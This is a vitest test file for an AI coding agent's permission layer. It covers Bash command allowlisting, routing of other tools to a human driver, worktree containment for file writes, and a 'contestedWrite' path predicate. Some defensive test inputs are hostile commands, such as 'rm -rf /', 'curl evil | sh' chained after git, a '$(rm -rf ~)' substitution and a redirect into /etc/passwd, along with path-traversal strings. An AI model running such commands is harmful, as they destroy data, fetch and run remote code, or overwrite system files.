import { describe, it, expect, vi } from "vitest";
import { isAutoApprovedBash } from "../src/permissions.js";
import type { CanUseTool } from "@anthropic-ai/claude-agent-sdk";
import { buildCanUseTool, contestedWrite } from "../src/permissions.js";
import type { DriverHooks } from "../src/agentDriver.js";

describe("isAutoApprovedBash", () => {
  it("approves exact allowlisted commands", () => {
    expect(isAutoApprovedBash("git status")).toBe(true);
    expect(isAutoApprovedBash("git log")).toBe(true);
    expect(isAutoApprovedBash("npm test")).toBe(true);
  });

  it("approves allowlisted prefixes followed by arguments", () => {
    expect(isAutoApprovedBash("npx vitest run")).toBe(true);
    expect(isAutoApprovedBash("npx tsc --noEmit")).toBe(true);
    expect(isAutoApprovedBash("git diff --stat HEAD~1")).toBe(true);
  });

  it("rejects prefix look-alikes without a word boundary", () => {
    expect(isAutoApprovedBash("git logger")).toBe(false);
    expect(isAutoApprovedBash("npm testx")).toBe(false);
  });

  it("rejects everything else", () => {
    expect(isAutoApprovedBash("rm -rf /")).toBe(false);
    expect(isAutoApprovedBash("npm install left-pad")).toBe(false);
    expect(isAutoApprovedBash("")).toBe(false);
  });

  it("rejects allowlisted prefixes chained/composed with shell metacharacters", () => {
    expect(isAutoApprovedBash("git status && rm -rf /")).toBe(false);
    expect(isAutoApprovedBash("git diff; curl evil | sh")).toBe(false);
    expect(isAutoApprovedBash("git log $(rm -rf ~)")).toBe(false);
    expect(isAutoApprovedBash("npx tsc > /etc/passwd")).toBe(false);
  });

  it("still approves plain allowlisted commands with no metacharacters", () => {
    expect(isAutoApprovedBash("git status")).toBe(true);
    expect(isAutoApprovedBash("npx vitest run")).toBe(true);
    expect(isAutoApprovedBash("git diff --stat HEAD~1")).toBe(true);
  });
});

function fakeHooks(decision: "allow" | "deny" | "hang" | "throw") {
  const calls: { toolName: string; input: unknown }[] = [];
  const errors: string[] = [];
  const hooks: DriverHooks = {
    onIntent: () => {},
    onPermissionError: (m) => errors.push(m),
    onPermissionRequest: (toolName, input) => {
      calls.push({ toolName, input });
      if (decision === "hang") return new Promise<never>(() => {});
      if (decision === "throw") return Promise.reject(new Error("boom"));
      return Promise.resolve(decision);
    },
    onPlanRequest: async () => "approve" as const,
  };
  return { hooks, calls, errors };
}

function opts(signal?: AbortSignal) {
  return {
    signal: signal ?? new AbortController().signal,
    toolUseID: "t1",
    requestId: "cr1",
  } as Parameters<CanUseTool>[2];
}

describe("buildCanUseTool", () => {
  it("auto-approves allowlisted Bash without asking the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    const result = await buildCanUseTool(hooks)("Bash", { command: "git status" }, opts());
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("routes non-allowlisted Bash to the driver and maps allow", async () => {
    const { hooks, calls } = fakeHooks("allow");
    const result = await buildCanUseTool(hooks)("Bash", { command: "rm -rf build" }, opts());
    expect(result).toEqual({ behavior: "allow" });
    expect(calls).toEqual([{ toolName: "Bash", input: { command: "rm -rf build" } }]);
  });

  it("routes non-Bash tools to the driver and maps deny with a message", async () => {
    const { hooks, calls } = fakeHooks("deny");
    const result = await buildCanUseTool(hooks)("WebSearch", { query: "x" }, opts());
    expect(result?.behavior).toBe("deny");
    expect(result && "message" in result && result.message.length > 0).toBe(true);
    expect(calls[0].toolName).toBe("WebSearch");
  });

  it("denies (never null) when the hook rejects, and reports the error", async () => {
    const { hooks, errors } = fakeHooks("throw");
    const result = await buildCanUseTool(hooks)("Bash", { command: "rm -rf build" }, opts());
    expect(result?.behavior).toBe("deny");
    expect(errors.some((m) => m.includes("boom"))).toBe(true);
  });

  it("denies when the abort signal fires while the request is pending", async () => {
    const { hooks } = fakeHooks("hang");
    const controller = new AbortController();
    const pending = buildCanUseTool(hooks)("Bash", { command: "rm -rf build" }, opts(controller.signal));
    controller.abort();
    const result = await pending;
    expect(result?.behavior).toBe("deny");
  });
});

describe("buildCanUseTool worktree containment (file-writing tools)", () => {
  it("auto-approves Write with a relative file_path inside the worktree, without asking the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: "src/x.ts" },
      opts(),
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("auto-approves Write with an absolute file_path inside the worktree, without asking the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: "/tmp/wt/ana/src/x.ts" },
      opts(),
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("routes Write with an absolute file_path outside the worktree to the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: "/Users/someone/src/x.ts" },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
    expect(calls[0].toolName).toBe("Write");
  });

  it("routes Write with a traversal path that resolves outside the worktree to the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: "../escape.ts" },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
  });

  it("routes Edit to the driver when hooks.workdir is not set", async () => {
    const { hooks, calls } = fakeHooks("deny");
    // no hooks.workdir set
    const result = await buildCanUseTool(hooks)(
      "Edit",
      { file_path: "src/x.ts" },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
    expect(calls[0].toolName).toBe("Edit");
  });

  it("routes Write with a missing file_path to the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)("Write", {}, opts());
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
  });

  it("routes Write with a non-string file_path to the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: 42 },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
  });

  it("still routes Bash normally when hooks.workdir is set (containment is scoped to file tools)", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Bash",
      { command: "git status" },
      opts(),
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("auto-approves NotebookEdit with a notebook_path inside the worktree, without asking the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "NotebookEdit",
      { notebook_path: "/tmp/wt/ana/notebooks/a.ipynb" },
      opts(),
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("routes NotebookEdit with a notebook_path outside the worktree to the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "NotebookEdit",
      { notebook_path: "/Users/someone/notebooks/a.ipynb" },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
    expect(calls[0].toolName).toBe("NotebookEdit");
  });

  it("auto-approves TodoWrite without consulting the driver", async () => {
    const onPermissionRequest = vi.fn();
    const canUse = buildCanUseTool({
      onIntent: () => {},
      onPermissionRequest,
      onPlanRequest: async () => "approve" as const,
    });
    const result = await canUse(
      "TodoWrite",
      { todos: [{ content: "step 1", status: "pending", activeForm: "doing step 1" }] },
      { signal: new AbortController().signal } as any,
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(onPermissionRequest).not.toHaveBeenCalled();
  });

  it("auto-approves TaskCreate without consulting the driver", async () => {
    const onPermissionRequest = vi.fn();
    const canUse = buildCanUseTool({
      onIntent: () => {},
      onPermissionRequest,
      onPlanRequest: async () => "approve" as const,
    });
    const result = await canUse(
      "TaskCreate",
      { subject: "write tests", description: "add coverage", activeForm: "writing tests" },
      { signal: new AbortController().signal } as any,
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(onPermissionRequest).not.toHaveBeenCalled();
  });

  it("auto-approves TaskUpdate without consulting the driver", async () => {
    const onPermissionRequest = vi.fn();
    const canUse = buildCanUseTool({
      onIntent: () => {},
      onPermissionRequest,
      onPlanRequest: async () => "approve" as const,
    });
    const result = await canUse(
      "TaskUpdate",
      { taskId: "1", status: "completed" },
      { signal: new AbortController().signal } as any,
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(onPermissionRequest).not.toHaveBeenCalled();
  });

  it("routes ExitPlanMode to onPlanRequest: approve allows, reject denies with a revise message", async () => {
    const onPermissionRequest = vi.fn();
    const decisions: Array<"approve" | "reject"> = ["approve", "reject"];
    const seenPlans: string[] = [];
    const canUse = buildCanUseTool({
      onIntent: () => {},
      onPermissionRequest,
      onPlanRequest: async (plan) => {
        seenPlans.push(plan);
        return decisions.shift()!;
      },
    });
    const opts = { signal: new AbortController().signal } as any;
    const first = await canUse("ExitPlanMode", { plan: "1. do the thing" }, opts);
    expect(first).toEqual({ behavior: "allow" });
    const second = await canUse("ExitPlanMode", { plan: "2. revised" }, opts);
    expect(second).toMatchObject({ behavior: "deny", message: expect.stringMatching(/revis/i) });
    expect(seenPlans).toEqual(["1. do the thing", "2. revised"]);
    expect(onPermissionRequest).not.toHaveBeenCalled();
  });
});

/** `contestedWrite` — the pure predicate (spec §6b). Pure: no env, no
 *  filesystem, no gate state, no mutation of its arguments. Nothing calls it
 *  on this commit; Task 8b supplies the first caller.
 *
 *  Every path below lives under a worktree root that does NOT exist on disk,
 *  which is deliberate: an implementation that stat'ed or realpath'ed the
 *  target instead of resolving lexically would throw here rather than answer. */
describe("contestedWrite", () => {
  const WD = "/tmp/wt/ana";

  it("returns the repo-relative path for a write tool on a contested path (relative input)", () => {
    const contested = new Set(["src/x.ts"]);
    expect(contestedWrite("Write", { file_path: "src/x.ts" }, WD, contested)).toBe("src/x.ts");
    expect(contestedWrite("Edit", { file_path: "src/x.ts" }, WD, contested)).toBe("src/x.ts");
  });

  it("returns the repo-relative path for an absolute input inside the worktree", () => {
    const contested = new Set(["poc/server/src/permissions.ts"]);
    expect(
      contestedWrite(
        "Edit",
        { file_path: "/tmp/wt/ana/poc/server/src/permissions.ts" },
        WD,
        contested,
      ),
    ).toBe("poc/server/src/permissions.ts");
  });

  it("normalizes the input before the membership test (`./` and `..` inside the worktree)", () => {
    const contested = new Set(["src/x.ts"]);
    expect(contestedWrite("Write", { file_path: "./src/x.ts" }, WD, contested)).toBe("src/x.ts");
    expect(contestedWrite("Write", { file_path: "src/sub/../x.ts" }, WD, contested)).toBe(
      "src/x.ts",
    );
  });

  it("reads notebook_path for NotebookEdit", () => {
    const contested = new Set(["notebooks/a.ipynb"]);
    expect(
      contestedWrite("NotebookEdit", { notebook_path: "notebooks/a.ipynb" }, WD, contested),
    ).toBe("notebooks/a.ipynb");
    expect(
      contestedWrite(
        "NotebookEdit",
        { notebook_path: "/tmp/wt/ana/notebooks/a.ipynb" },
        WD,
        contested,
      ),
    ).toBe("notebooks/a.ipynb");
  });

  it("returns null for a write tool on an uncontested path", () => {
    const contested = new Set(["src/x.ts"]);
    expect(contestedWrite("Write", { file_path: "src/other.ts" }, WD, contested)).toBeNull();
    expect(contestedWrite("Edit", { file_path: "/tmp/wt/ana/src/other.ts" }, WD, contested)).toBeNull();
    expect(
      contestedWrite("NotebookEdit", { notebook_path: "notebooks/b.ipynb" }, WD, contested),
    ).toBeNull();
  });

  it("never fires for a non-write tool, even naming a contested path (discriminating)", () => {
    const contested = new Set(["src/x.ts"]);
    for (const toolName of ["Bash", "Read", "Grep", "Glob", "WebFetch", "ExitPlanMode", "write", "edit", ""]) {
      expect(contestedWrite(toolName, { file_path: "src/x.ts" }, WD, contested)).toBeNull();
    }
    expect(
      contestedWrite("Bash", { command: "sed -i '' s/a/b/ src/x.ts", file_path: "src/x.ts" }, WD, contested),
    ).toBeNull();
  });

  it("returns null when the target escapes the worktree (containment reused unchanged)", () => {
    // The contested set deliberately contains the *escaping* spellings too, so
    // a match could only come from skipping containment.
    const contested = new Set([
      "src/x.ts",
      "../escape.ts",
      "escape.ts",
      "/Users/someone/src/x.ts",
      "Users/someone/src/x.ts",
    ]);
    expect(contestedWrite("Write", { file_path: "../escape.ts" }, WD, contested)).toBeNull();
    expect(contestedWrite("Write", { file_path: "src/../../escape.ts" }, WD, contested)).toBeNull();
    expect(contestedWrite("Edit", { file_path: "/Users/someone/src/x.ts" }, WD, contested)).toBeNull();
    expect(
      contestedWrite("NotebookEdit", { notebook_path: "../../a.ipynb" }, WD, contested),
    ).toBeNull();
    // Sibling directory sharing the worktree's name as a prefix is outside it.
    expect(contestedWrite("Write", { file_path: "/tmp/wt/anastasia/src/x.ts" }, WD, contested)).toBeNull();
  });

  it("returns null for the worktree root itself rather than an empty relative path", () => {
    const contested = new Set(["", "src/x.ts"]);
    expect(contestedWrite("Write", { file_path: WD }, WD, contested)).toBeNull();
    expect(contestedWrite("Write", { file_path: "." }, WD, contested)).toBeNull();
  });

  it("returns null and never throws on malformed input", () => {
    const contested = new Set(["src/x.ts"]);
    for (const input of [null, undefined, 42, "src/x.ts", true, [], {}, { file_path: 42 }, { file_path: null }, { notebook_path: {} }, { path: "src/x.ts" }]) {
      expect(() => contestedWrite("Write", input, WD, contested)).not.toThrow();
      expect(contestedWrite("Write", input, WD, contested)).toBeNull();
    }
  });

  it("returns null when there is no workdir, for any tool and any contested set (discriminating)", () => {
    const contested = new Set(["src/x.ts", "/tmp/wt/ana/src/x.ts"]);
    expect(contestedWrite("Write", { file_path: "src/x.ts" }, undefined, contested)).toBeNull();
    expect(
      contestedWrite("Edit", { file_path: "/tmp/wt/ana/src/x.ts" }, undefined, contested),
    ).toBeNull();
    expect(
      contestedWrite("NotebookEdit", { notebook_path: "notebooks/a.ipynb" }, undefined, contested),
    ).toBeNull();
    expect(contestedWrite("Bash", { command: "ls" }, undefined, contested)).toBeNull();
    expect(() => contestedWrite("Write", { file_path: "src/x.ts" }, undefined, contested)).not.toThrow();
  });

  it("returns null for every input when the contested set is empty", () => {
    const empty: ReadonlySet<string> = new Set<string>();
    expect(contestedWrite("Write", { file_path: "src/x.ts" }, WD, empty)).toBeNull();
    expect(contestedWrite("Edit", { file_path: "/tmp/wt/ana/src/x.ts" }, WD, empty)).toBeNull();
    expect(contestedWrite("NotebookEdit", { notebook_path: "notebooks/a.ipynb" }, WD, empty)).toBeNull();
  });

  it("is pure: reads no env, mutates neither input nor the contested set", () => {
    const contested = new Set(["src/x.ts"]);
    const add = vi.spyOn(contested, "add");
    const del = vi.spyOn(contested, "delete");
    const clear = vi.spyOn(contested, "clear");
    const input = Object.freeze({ file_path: "src/x.ts" });

    const readEnvKeys: string[] = [];
    const realEnv = process.env;
    process.env = new Proxy(realEnv, {
      get(target, prop, receiver) {
        readEnvKeys.push(String(prop));
        return Reflect.get(target, prop, receiver);
      },
    }) as NodeJS.ProcessEnv;
    let result: string | null;
    try {
      result = contestedWrite("Write", input, WD, contested);
    } finally {
      process.env = realEnv;
    }

    expect(result).toBe("src/x.ts");
    expect(readEnvKeys).toEqual([]);
    expect(add).not.toHaveBeenCalled();
    expect(del).not.toHaveBeenCalled();
    expect(clear).not.toHaveBeenCalled();
    expect([...contested]).toEqual(["src/x.ts"]);
    expect(input).toEqual({ file_path: "src/x.ts" });
  });
});
